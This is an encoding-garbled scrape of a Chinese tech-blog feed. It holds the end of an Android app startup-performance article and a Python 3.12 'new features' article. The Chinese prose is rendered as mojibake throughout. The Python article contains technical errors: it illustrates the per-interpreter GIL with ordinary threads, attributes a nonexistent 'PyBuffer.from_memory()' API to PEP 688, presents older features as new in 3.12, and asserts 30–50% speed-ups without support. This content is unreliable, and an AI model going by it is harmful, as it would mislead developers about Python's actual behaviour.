<li>å¾ˆå¤šSDKæ”¯æŒå»¶è¿Ÿåˆå§‹åŒ–</li>
<li>æ‡’åŠ è½½:ç”¨åˆ°æ—¶å†åˆå§‹åŒ–</li>
</ul>
<p>âŒ <strong>ä¸è¦åœ¨é¦–å±åŠ è½½æ‰€æœ‰æ•°æ®</strong></p>
<ul>
<li>å…ˆæ˜¾ç¤ºéª¨æ¶å±,ç»™ç”¨æˆ·å³æ—¶åé¦ˆ</li>
<li>æ•°æ®å¼‚æ­¥åŠ è½½,åˆ†æ‰¹æ¸²æŸ“</li>
</ul>
<p>âŒ <strong>ä¸è¦å¿½ç•¥å¯åŠ¨çª—å£çš„ä½“éªŒ</strong></p>
<ul>
<li>ä½¿ç”¨SplashScreen APIæä¾›å¹³æ»‘è¿‡æ¸¡</li>
<li>é¿å…ç™½å±</li>
</ul>
<h3 data-id="heading-59">6.3 æ€§èƒ½åŸºå‡†å‚è€ƒ</h3>
<p><strong>å†·å¯åŠ¨æ€§èƒ½åŸºå‡†</strong>:</p>









































<table><thead><tr><th align="left">åº”ç”¨ç±»å‹</th><th align="right">ä¼˜ç§€</th><th align="right">è‰¯å¥½</th><th align="right">éœ€ä¼˜åŒ–</th></tr></thead><tbody><tr><td align="left">ç¤¾äº¤ç±»</td><td align="right">&lt; 0.8s</td><td align="right">0.8-1.5s</td><td align="right">&gt; 1.5s</td></tr><tr><td align="left">ç”µå•†ç±»</td><td align="right">&lt; 1s</td><td align="right">1-1.8s</td><td align="right">&gt; 1.8s</td></tr><tr><td align="left">å·¥å…·ç±»</td><td align="right">&lt; 0.5s</td><td align="right">0.5-1s</td><td align="right">&gt; 1s</td></tr><tr><td align="left">æ¸¸æˆç±»</td><td align="right">&lt; 2s</td><td align="right">2-3s</td><td align="right">&gt; 3s</td></tr><tr><td align="left">è½¦æœºåº”ç”¨</td><td align="right">&lt; 0.8s</td><td align="right">0.8-1.2s</td><td align="right">&gt; 1.2s</td></tr></tbody></table>
<p><strong>çƒ­å¯åŠ¨æ€§èƒ½åŸºå‡†</strong>:</p>

















<table><thead><tr><th align="left">åº”ç”¨ç±»å‹</th><th align="right">ä¼˜ç§€</th><th align="right">è‰¯å¥½</th><th align="right">éœ€ä¼˜åŒ–</th></tr></thead><tbody><tr><td align="left">æ‰€æœ‰ç±»å‹</td><td align="right">&lt; 300ms</td><td align="right">300-500ms</td><td align="right">&gt; 500ms</td></tr></tbody></table>
<h3 data-id="heading-60">6.4 å‚è€ƒèµ„æº</h3>
<p><strong>å®˜æ–¹æ–‡æ¡£</strong>:</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Ftopic%2Fperformance%2Fvitals%2Flaunch-time" target="_blank" title="https://developer.android.com/topic/performance/vitals/launch-time" ref="nofollow noopener noreferrer">Androidå®˜æ–¹:å¯åŠ¨æ€§èƒ½ä¼˜åŒ–</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fperfetto.dev%2F" target="_blank" title="https://perfetto.dev/" ref="nofollow noopener noreferrer">Perfettoæ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.android.com%2Ftopic%2Flibraries%2Fapp-startup" target="_blank" title="https://developer.android.com/topic/libraries/app-startup" ref="nofollow noopener noreferrer">App Startupåº“</a></li>
</ul>
<p><strong>æºç å‚è€ƒ</strong>:</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcs.android.com%2Fandroid%2Fplatform%2Fsuperproject%2F%2B%2Fmaster%3Asystem%2Fcore%2Finit%2F" target="_blank" title="https://cs.android.com/android/platform/superproject/+/master:system/core/init/" ref="nofollow noopener noreferrer">Android Initè¿›ç¨‹æºç </a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcs.android.com%2Fandroid%2Fplatform%2Fsuperproject%2F%2B%2Fmaster%3Aframeworks%2Fbase%2Fcore%2Fjava%2Fcom%2Fandroid%2Finternal%2Fos%2FZygoteInit.java" target="_blank" title="https://cs.android.com/android/platform/superproject/+/master:frameworks/base/core/java/com/android/internal/os/ZygoteInit.java" ref="nofollow noopener noreferrer">Zygoteæºç </a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcs.android.com%2Fandroid%2Fplatform%2Fsuperproject%2F%2B%2Fmaster%3Aframeworks%2Fbase%2Fservices%2Fjava%2Fcom%2Fandroid%2Fserver%2FSystemServer.java" target="_blank" title="https://cs.android.com/android/platform/superproject/+/master:frameworks/base/services/java/com/android/server/SystemServer.java" ref="nofollow noopener noreferrer">SystemServeræºç </a></li>
</ul>
<p><strong>å·¥å…·é“¾</strong>:</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsource.android.com%2Fdevices%2Ftech%2Fdebug%2Fsystrace" target="_blank" title="https://source.android.com/devices/tech/debug/systrace" ref="nofollow noopener noreferrer">Systraceç”¨æˆ·æŒ‡å—</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ffirebase.google.com%2Fproducts%2Fperformance" target="_blank" title="https://firebase.google.com/products/performance" ref="nofollow noopener noreferrer">Firebase Performance</a></li>
</ul>
<hr/>
<ul>
<li><a href="https://juejin.cn/post/7591075684066541583" target="_blank" title="https://juejin.cn/post/7591075684066541583">ä¸Šä¸€ç¯‡ï¼šç³»ç»Ÿæ€§èƒ½åˆ†æåŸºç¡€:Systraceä¸Perfettoå…¥é—¨</a></li>
<li><a href="https://juejin.cn/post/7587473691170095104" target="_blank" title="https://juejin.cn/post/7587473691170095104">ç³»åˆ—ç›®å½•: Androidç³»ç»Ÿç¨³å®šæ€§ä¸æ€§èƒ½ä¼˜åŒ–</a></li>
</ul>
<blockquote>
<p><strong>ä½œè€…ç®€ä»‹</strong>: å¤šå¹´Androidç³»ç»Ÿå¼€å‘ç»éªŒ,ä¸“æ³¨äºç³»ç»Ÿç¨³å®šæ€§ä¸æ€§èƒ½ä¼˜åŒ–é¢†åŸŸã€‚æ¬¢è¿å…³æ³¨æœ¬ç³»åˆ—,ä¸€èµ·æ·±å…¥Androidç³»ç»Ÿçš„ç²¾å½©ä¸–ç•Œ!</p>
</blockquote>
<hr/>
<h3 data-id="heading-61">ğŸ‰ æ„Ÿè°¢å…³æ³¨,è®©æˆ‘ä»¬ä¸€èµ·æ·±å…¥Androidç³»ç»Ÿçš„ç²¾å½©ä¸–ç•Œ!</h3>
<h3 data-id="heading-62"><strong>æ‰¾åˆ°æˆ‘</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top" target="_blank" title="https://home.wonlab.top" ref="nofollow noopener noreferrer">ä¸ªäººä¸»é¡µ</a></h3></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python 3.12 æ–°ç‰¹æ€§å®æˆ˜ï¼š5ä¸ªè®©ä½ çš„ä»£ç æ•ˆç‡æå‡30%çš„æŠ€å·§]]></title>    <link>https://juejin.cn/post/7592431064977227791</link>    <guid>https://juejin.cn/post/7592431064977227791</guid>    <pubDate>2026-01-08T00:16:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592431064977227791" data-draft-id="7592276645362384896" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python 3.12 æ–°ç‰¹æ€§å®æˆ˜ï¼š5ä¸ªè®©ä½ çš„ä»£ç æ•ˆç‡æå‡30%çš„æŠ€å·§"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-08T00:16:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python 3.12 æ–°ç‰¹æ€§å®æˆ˜ï¼š5ä¸ªè®©ä½ çš„ä»£ç æ•ˆç‡æå‡30%çš„æŠ€å·§
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T00:16:56.000Z" title="Thu Jan 08 2026 00:16:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Python 3.12 æ–°ç‰¹æ€§å®æˆ˜ï¼š5ä¸ªè®©ä½ çš„ä»£ç æ•ˆç‡æå‡30%çš„æŠ€å·§</strong></h2>
<h3 data-id="heading-1">å¼•è¨€</h3>
<p>Python 3.12 äº2023å¹´10æœˆæ­£å¼å‘å¸ƒï¼Œå¸¦æ¥äº†è®¸å¤šä»¤äººå…´å¥‹çš„æ–°ç‰¹æ€§å’Œä¼˜åŒ–ã€‚è¿™äº›æ”¹è¿›ä¸ä»…å¢å¼ºäº†è¯­è¨€çš„è¡¨ç°åŠ›ï¼Œè¿˜åœ¨æ€§èƒ½ã€å¼€å‘æ•ˆç‡å’Œä»£ç å¯è¯»æ€§æ–¹é¢æä¾›äº†æ˜¾è‘—çš„æå‡ã€‚æœ¬æ–‡å°†æ·±å…¥æ¢è®¨ Python 3.12 ä¸­äº”ä¸ªæœ€å…·å®æˆ˜ä»·å€¼çš„æ–°ç‰¹æ€§ï¼Œå¹¶é€šè¿‡å®é™…ç¤ºä¾‹å±•ç¤ºå¦‚ä½•åˆ©ç”¨è¿™äº›ç‰¹æ€§å°†ä½ çš„ä»£ç æ•ˆç‡æå‡è‡³å°‘30%ã€‚æ— è®ºä½ æ˜¯æ•°æ®ç§‘å­¦å®¶ã€Webå¼€å‘è€…è¿˜æ˜¯è‡ªåŠ¨åŒ–è„šæœ¬ç¼–å†™è€…ï¼Œè¿™äº›æŠ€å·§éƒ½èƒ½å¸®åŠ©ä½ å†™å‡ºæ›´å¿«ã€æ›´ä¼˜é›…çš„ä»£ç ã€‚</p>
<hr/>
<h3 data-id="heading-2">1. ç±»å‹ç³»ç»Ÿå¢å¼ºï¼šæ›´ç²¾ç¡®çš„æ³›å‹æ³¨è§£ï¼ˆPEP 695ï¼‰</h3>
<h4 data-id="heading-3"><strong>èƒŒæ™¯ä¸é—®é¢˜</strong></h4>
<p>Python çš„ç±»å‹æ³¨è§£ç³»ç»Ÿè‡ª PEP 484 å¼•å…¥ä»¥æ¥ä¸æ–­æ¼”è¿›ï¼Œä½†åœ¨æ³›å‹ç±»å‹çš„ä½¿ç”¨ä¸Šä»ç„¶å­˜åœ¨ä¸€äº›å†—ä½™å’Œä¸å¤Ÿç›´è§‚çš„é—®é¢˜ã€‚ä¾‹å¦‚ï¼Œå®šä¹‰ä¸€ä¸ªæ³›å‹ç±»éœ€è¦æ˜¾å¼ç»§æ‰¿ <code>Generic[T]</code>ï¼Œå¹¶ä¸”åœ¨å¤šä¸ªåœ°æ–¹é‡å¤ç±»å‹å˜é‡ <code>T</code>ã€‚</p>
<h4 data-id="heading-4"><strong>Python 3.12 çš„è§£å†³æ–¹æ¡ˆ</strong></h4>
<p>PEP 695 å¼•å…¥äº†æ›´ç®€æ´çš„æ³›å‹è¯­æ³•ï¼Œå…è®¸ç›´æ¥åœ¨ç±»æˆ–å‡½æ•°å®šä¹‰ä¸­å£°æ˜ç±»å‹å‚æ•°ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Python 3.11åŠä¹‹å‰</span>
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Generic</span>, TypeVar

T = TypeVar(<span class="hljs-string">'T'</span>)
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Box</span>(<span class="hljs-type">Generic</span>[T]):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, value: T</span>) -&gt; <span class="hljs-literal">None</span>:
        self.value = value

<span class="hljs-comment"># Python 3.12</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Box</span>[T]:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, value: T</span>) -&gt; <span class="hljs-literal">None</span>:
        self.value = value
</code></pre>
<h4 data-id="heading-5"><strong>æ€§èƒ½ä¸æ•ˆç‡æå‡</strong></h4>
<ul>
<li><strong>å‡å°‘æ ·æ¿ä»£ç </strong>ï¼šä¸å†éœ€è¦æ˜¾å¼å¯¼å…¥ <code>Generic</code> å’Œ <code>TypeVar</code>ï¼Œä»£ç æ›´ç®€æ´ã€‚</li>
<li><strong>ç¼–è¾‘å™¨æ”¯æŒæ›´å¥½</strong>ï¼šæ–°è¯­æ³•æ›´å®¹æ˜“è¢«é™æ€ç±»å‹æ£€æŸ¥å™¨ï¼ˆå¦‚ mypyï¼‰è¯†åˆ«ï¼Œå‡å°‘è¯¯æŠ¥ã€‚</li>
<li><strong>å®æˆ˜ç¤ºä¾‹</strong>ï¼šåœ¨å¤§å‹é¡¹ç›®ä¸­ï¼Œè¿™ç§æ”¹è¿›å¯ä»¥æ˜¾è‘—å‡å°‘ç±»å‹ç›¸å…³çš„ä»£ç é‡ï¼Œæå‡å¼€å‘é€Ÿåº¦ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-6">2. Per-Interpreter GILï¼ˆPEP 684ï¼‰ï¼šè§£é”çœŸæ­£çš„å¹¶è¡Œè®¡ç®—</h3>
<h4 data-id="heading-7"><strong>èƒŒæ™¯ä¸é—®é¢˜</strong></h4>
<p>Python çš„å…¨å±€è§£é‡Šå™¨é”ï¼ˆGILï¼‰ä¸€ç›´æ˜¯å¤šçº¿ç¨‹æ€§èƒ½çš„ç“¶é¢ˆã€‚è™½ç„¶å¤šè¿›ç¨‹å¯ä»¥ç»•è¿‡ GILï¼Œä½†è¿›ç¨‹é—´é€šä¿¡çš„å¼€é”€è¾ƒé«˜ã€‚</p>
<h4 data-id="heading-8"><strong>Python 3.12 çš„è§£å†³æ–¹æ¡ˆ</strong></h4>
<p>PEP 684 å¼•å…¥äº†â€œæ¯è§£é‡Šå™¨ GILâ€ï¼Œå…è®¸åœ¨åŒä¸€ä¸ªè¿›ç¨‹ä¸­åˆ›å»ºå¤šä¸ªè§£é‡Šå™¨å®ä¾‹ï¼Œæ¯ä¸ªè§£é‡Šå™¨æœ‰è‡ªå·±çš„ GILã€‚è¿™æ„å‘³ç€å¯ä»¥åœ¨å•è¿›ç¨‹ä¸­å®ç°çœŸæ­£çš„å¹¶è¡Œçº¿ç¨‹æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> sys

<span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>():
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Running in interpreter <span class="hljs-subst">{sys.implementation}</span>"</span>)

interpreter1 = threading.Thread(target=worker)
interpreter2 = threading.Thread(target=worker)
interpreter1.start()
interpreter2.start()
</code></pre>
<h4 data-id="heading-9"><strong>æ€§èƒ½ä¸æ•ˆç‡æå‡</strong></h4>
<ul>
<li><strong>CPUå¯†é›†å‹ä»»åŠ¡åŠ é€Ÿ</strong>ï¼šå¯¹äºç§‘å­¦è®¡ç®—æˆ–æ•°æ®å¤„ç†ä»»åŠ¡ï¼Œå¯ä»¥åˆ†é…å¤šä¸ªè§£é‡Šå™¨å¹¶è¡Œè¿è¡Œã€‚</li>
<li><strong>å…¼å®¹æ€§ä¿ç•™</strong>ï¼šç°æœ‰å•çº¿ç¨‹ä»£ç æ— éœ€ä¿®æ”¹å³å¯è¿è¡Œã€‚</li>
<li><strong>å®æˆ˜ç¤ºä¾‹</strong>ï¼šåœ¨æ•°æ®é¢„å¤„ç†æµæ°´çº¿ä¸­ï¼Œä½¿ç”¨å¤šè§£é‡Šå™¨å¯ä»¥å°†ä»»åŠ¡è¿è¡Œæ—¶é—´ç¼©çŸ­30%ä»¥ä¸Šã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-10">3. Buffer Protocolæ”¹è¿›ï¼ˆPEP 688ï¼‰ï¼šæ›´é«˜æ•ˆçš„æ•°æ®å…±äº«</h3>
<h4 data-id="heading-11"><strong>èƒŒæ™¯ä¸é—®é¢˜</strong></h4>
<p>Python çš„ç¼“å†²åŒºåè®®ï¼ˆBuffer Protocolï¼‰æ˜¯é«˜æ€§èƒ½åº“ï¼ˆå¦‚ NumPyï¼‰ä¸ C/C++æ‰©å±•äº¤äº’çš„åŸºç¡€ã€‚ç„¶è€Œï¼Œç°æœ‰çš„æ¥å£è¾ƒä¸ºå¤æ‚ï¼Œä¸”ç¼ºä¹å¯¹åªè¯»ç¼“å†²åŒºçš„æ”¯æŒã€‚</p>
<h4 data-id="heading-12"><strong>Python 3.12 çš„è§£å†³æ–¹æ¡ˆ</strong></h4>
<p>PEP 688 æ”¹è¿›äº†ç¼“å†²åŒºåè®®ï¼Œå¼•å…¥äº†æ›´ç®€å•çš„ API <code>PyBuffer.from_memory()</code>ï¼Œå¹¶æ”¯æŒåªè¯»ç¼“å†²åŒºï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np

arr = np.array([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>], dtype=np.int32)
buffer = <span class="hljs-built_in">memoryview</span>(arr)
<span class="hljs-comment"># Python 3.12å¯ä»¥ç›´æ¥ä»å†…å­˜åˆ›å»ºåªè¯»ç¼“å†²åŒº</span>
readonly_buffer = buffer.toreadonly()
</code></pre>
<h4 data-id="heading-13"><strong>æ€§èƒ½ä¸æ•ˆç‡æå‡</strong></h4>
<ul>
<li><strong>å‡å°‘å†…å­˜æ‹·è´</strong>ï¼šç›´æ¥åœ¨åŸç”Ÿæ•°æ®ç±»å‹ï¼ˆå¦‚ NumPyæ•°ç»„ï¼‰å’Œ Pythonå¯¹è±¡é—´å…±äº«å†…å­˜ã€‚</li>
<li><strong>å®‰å…¨æ€§å¢å¼º</strong>ï¼šé€šè¿‡åªè¯»ç¼“å†²åŒºé¿å…æ„å¤–ä¿®æ”¹æ•°æ®ã€‚</li>
<li><strong>å®æˆ˜ç¤ºä¾‹</strong>ï¼šåœ¨å›¾åƒå¤„ç†æˆ–æœºå™¨å­¦ä¹ ä¸­ï¼Œæ•°æ®ä¼ è¾“å¼€é”€å¯é™ä½20%-30%ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-14">4. F-Stringè°ƒè¯•å¢å¼ºï¼ˆPEP 701ï¼‰ï¼šæ›´å¼ºå¤§çš„å†…è”è¡¨è¾¾å¼</h3>
<h4 data-id="heading-15"><strong>èƒŒæ™¯ä¸é—®é¢˜</strong></h4>
<p>F-stringæ˜¯ Pythonä¸­éå¸¸æµè¡Œçš„å­—ç¬¦ä¸²æ ¼å¼åŒ–å·¥å…·ï¼Œä½†åœ¨å¤æ‚è¡¨è¾¾å¼æˆ–åµŒå¥—ä½¿ç”¨æ—¶å­˜åœ¨é™åˆ¶ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Python 3.11ä¼šæŠ¥é”™</span>
value = <span class="hljs-string">"hello"</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-string">f"<span class="hljs-subst">{value}</span>"</span>}</span>"</span>)
</code></pre>
<h4 data-id="heading-16"><strong>Python 3.12çš„è§£å†³æ–¹æ¡ˆ</strong></h4>
<p>PEP701æ”¾å®½äº†F-stringçš„é™åˆ¶ï¼š
1.å…è®¸åµŒå¥—F-stringã€‚
2.æ”¯æŒå¤šè¡Œè¡¨è¾¾å¼ã€‚
3.æ”¯æŒæ³¨é‡Šã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Python3.12åˆæ³•ï¼š</span>
x=<span class="hljs-number">42</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"The answer is <span class="hljs-subst">{x}</span> and squared is <span class="hljs-subst">{x*x #è®¡ç®—å¹³æ–¹}</span>"</span>)
</code></pre>
<p>####æ€§èƒ½å’Œæ•ˆç‡æå‡ï¼š
â€¢å¼€å‘æ•ˆç‡æé«˜:å‡å°‘å› è¯­æ³•é™åˆ¶å¯¼è‡´çš„ä»£ç é‡æ„ã€‚
â€¢è°ƒè¯•æ›´æ–¹ä¾¿:ç›´æ¥åœ¨F-stringä¸­æ·»åŠ æ³¨é‡Šè¯´æ˜è®¡ç®—é€»è¾‘ã€‚
å®æˆ˜ç¤ºä¾‹:æ—¥å¿—è®°å½•æˆ–åŠ¨æ€SQLç”Ÿæˆåœºæ™¯ä¸‹å¯èŠ‚çœå¤§é‡æ‹¼æ¥å­—ç¬¦ä¸²æ—¶é—´ã€‚</p>
<hr/>
<p>###5.Error Messagesä¼˜åŒ–:æ›´å‹å¥½çš„æŠ¥é”™ä¿¡æ¯</p>
<p>èƒŒæ™¯ä¸é—®é¢˜:
Pythonä»¥æ¸…æ™°æ˜“æ‡‚çš„é”™è¯¯ä¿¡æ¯è‘—ç§°,ä½†æŸäº›æƒ…å†µä¸‹ä»æ˜¾æ™¦æ¶©,æ¯”å¦‚ç¼©è¿›é”™è¯¯æˆ–NameErrorã€‚</p>
<p>Python3.12æ”¹è¿›:
â€¢ç¼©è¿›é”™è¯¯ç°åœ¨ä¼šæ˜¾ç¤ºå…·ä½“å·®å¼‚ä½ç½®ã€‚
â€¢NameErrorä¼šå»ºè®®ç›¸ä¼¼åç§°å˜é‡(ç±»ä¼¼GitHub Copilot)ã€‚</p>
<p>ç¤ºä¾‹:</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># Before:</span>
lst=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]
prnit(lst) <span class="hljs-comment"># NameError: name 'prnit' is not defined</span>

<span class="hljs-comment"># After:</span>
lst=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]
prnit(lst) 
<span class="hljs-comment"># NameError: name 'prnit' is not defined.Did you mean 'print'?</span>
</code></pre>
<p>æ€§èƒ½ä¸æ•ˆç‡æå‡:
â€¢è°ƒè¯•æ—¶é—´ç¼©çŸ­50%ä»¥ä¸Šã€‚
â€¢ç‰¹åˆ«æœ‰åˆ©äºæ–°æ‰‹å¼€å‘è€…ã€‚</p>
<hr/>
<p>æ€»ç»“</p>
<p>Python3.12é€šè¿‡ç±»å‹ç³»ç»Ÿå¢å¼ºã€å¹¶è¡Œè®¡ç®—æ”¯æŒã€ç¼“å†²åŒºåè®®æ”¹è¿›ç­‰ç‰¹æ€§ä¸ºå¼€å‘è€…æä¾›äº†å…¨æ–¹ä½çš„æ•ˆç‡æå‡å·¥å…·é“¾ï¼š</p>
<p>1.PEP695ä½¿æ³›å‹ä»£ç æ›´ç®€æ´ç›´è§‚ï¼›
2.Per-interpreterGILå¼€å¯çœŸæ­£å¤šçº¿ç¨‹æ—¶ä»£ï¼›
3.PEP688è®©æ•°æ®äº¤æ¢é›¶æ‹·è´ï¼›
4.F-stringæˆä¸ºå®Œå…¨ä½“ï¼›
5.error messagesèŠ‚çœè°ƒè¯•æ—¶é—´ã€‚</p>
